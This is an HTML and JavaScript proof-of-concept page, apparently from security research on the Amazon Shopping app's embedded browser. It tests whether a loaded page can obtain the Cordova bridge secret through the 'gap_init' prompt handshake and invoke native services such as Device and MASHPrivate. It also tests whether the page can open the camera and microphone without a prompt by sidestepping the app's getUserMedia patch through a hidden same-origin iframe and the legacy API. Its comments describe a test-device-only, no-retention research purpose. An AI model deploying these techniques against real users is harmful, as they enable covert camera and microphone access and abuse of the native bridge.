<!doctype html>
<!-- 0xnet research page for lead e6ce41d6, step E4 (rev 2). To be loaded ONLY on our own test device.
     It shows on screen (a) whether the page it is loaded in exposes the Cordova bridge of the Amazon Shopping app's
     embedded browser and (b) whether the web view hands out camera / microphone without asking.
     Minimum data: it prints track kinds, labels and one frame's pixel size. No image, sound or identifier is kept,
     nothing is sent anywhere, every track is stopped at once. -->
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>0xnet research page (e6ce41d6 E4)</title>
<body style="font:15px/1.4 sans-serif;margin:14px">
<h3>0xnet research page: e6ce41d6 E4</h3>
<pre id="out" style="white-space:pre-wrap;word-break:break-all"></pre>
<script>
(function () {
  var out = document.getElementById('out');
  function log(k, v) { out.textContent += k + ': ' + v + '\n'; try { console.log('0xnet-e4 ' + k + ': ' + v); } catch (e) {} }
  function describe(stream) {
    return stream.getTracks().map(function (t) { return t.kind + ' "' + t.label + '" ' + t.readyState; }).join(' | ');
  }
  function stop(stream) { stream.getTracks().forEach(function (t) { t.stop(); }); }

  log('marker', '0xnet-acctsw-E4');
  log('location', location.href);
  log('userAgent', navigator.userAgent);

  // ---------- part 1: native bridge ----------
  log('_cordovaNative present', typeof window._cordovaNative);
  log('smash present', typeof window.smash);
  var secret = null;
  try {
    // Same handshake cordova.js uses on Android: prompt(args, "gap_init:<bridge mode>") returns the bridge secret.
    secret = window.prompt('', 'gap_init:0');
    log('gap_init returned', secret === null ? 'null' : (secret === '' ? '(empty string: refused)' : 'a secret of ' + String(secret).length + ' digits'));
  } catch (e) { log('gap_init threw', e); }
  if (secret) {
    try {
      var r = window.prompt('[]', 'gap:' + JSON.stringify([parseInt(secret, 10), 'Device', 'getDeviceInfo', 'Device0xnetE4']));
      log('Device.getDeviceInfo (sync reply)', r);
      log('gap_poll reply', window.prompt('1', 'gap_poll:' + secret));
    } catch (e) { log('exec threw', e); }
    try {
      // In-page control: a service the embedded browser must refuse.
      var c = window.prompt('[]', 'gap:' + JSON.stringify([parseInt(secret, 10), 'MASHPrivate', 'GetPushNotificationInfo', 'Ctl0xnetE4']));
      log('control MASHPrivate.GetPushNotificationInfo (sync reply)', c);
      log('control gap_poll reply', window.prompt('1', 'gap_poll:' + secret));
    } catch (e) { log('control threw', e); }
  }

  // ---------- part 2: camera / microphone ----------
  // The app patches navigator.mediaDevices.__proto__.getUserMedia at page start. Wait a moment so the patch is in place,
  // then compare the patched top-level call (expected: blocked) with two calls the patch does not cover.
  setTimeout(function () {
    var want = { video: true, audio: true };
    // A. in-page control: the top-level standard API (expected to be neutered by the app's patch)
    try {
      var pA = navigator.mediaDevices && navigator.mediaDevices.getUserMedia(want);
      if (pA && pA.then) {
        pA.then(function (s) { log('A top-level getUserMedia', 'STREAM without a prompt: ' + describe(s)); stop(s); },
                function (e) { log('A top-level getUserMedia', 'refused: ' + e.name); });
      } else { log('A top-level getUserMedia', 'blocked by the app patch (returned ' + pA + ')'); }
    } catch (e) { log('A top-level getUserMedia', 'threw ' + e); }

    // B. a fresh same-origin frame has its own, unpatched MediaDevices prototype (video and audio asked separately)
    try {
      var f = document.createElement('iframe');
      f.style.display = 'none';
      document.body.appendChild(f);
      var md = f.contentWindow.navigator.mediaDevices;
      md.getUserMedia({ video: true }).then(function (s) {
        log('B1 frame getUserMedia video', 'STREAM without a prompt: ' + describe(s));
        var v = document.createElement('video');
        v.muted = true; v.playsInline = true; v.srcObject = s;
        v.onloadedmetadata = function () { log('B1 one video frame', v.videoWidth + 'x' + v.videoHeight + ' px (not kept)'); stop(s); };
        setTimeout(function () { stop(s); }, 3000);
      }, function (e) { log('B1 frame getUserMedia video', 'refused: ' + e.name + ' ' + (e.message || '')); });
      md.getUserMedia({ audio: true }).then(function (s) {
        log('B2 frame getUserMedia audio', 'STREAM without a prompt: ' + describe(s)); stop(s);
      }, function (e) { log('B2 frame getUserMedia audio', 'refused: ' + e.name + ' ' + (e.message || '')); });
    } catch (e) { log('B frame getUserMedia', 'threw ' + e); }

    // C. the legacy entry point lives on Navigator, not on MediaDevices
    try {
      var legacy = navigator.webkitGetUserMedia || navigator.getUserMedia;
      if (legacy) {
        legacy.call(navigator, { audio: true },
          function (s) { log('C legacy getUserMedia', 'STREAM without a prompt: ' + describe(s)); stop(s); },
          function (e) { log('C legacy getUserMedia', 'refused: ' + (e && e.name)); });
      } else { log('C legacy getUserMedia', 'not present'); }
    } catch (e) { log('C legacy getUserMedia', 'threw ' + e); }

    // D. geolocation (the app denies it natively in the embedded browser: expected refusal)
    try {
      navigator.geolocation.getCurrentPosition(
        function () { log('D geolocation', 'POSITION returned without a prompt (value not printed)'); },
        function (e) { log('D geolocation', 'refused: code ' + e.code); }, { timeout: 5000 });
    } catch (e) { log('D geolocation', 'threw ' + e); }
    setTimeout(function () { log('done', new Date().toISOString()); }, 6500);
  }, 1500);
})();
</script>
</body>
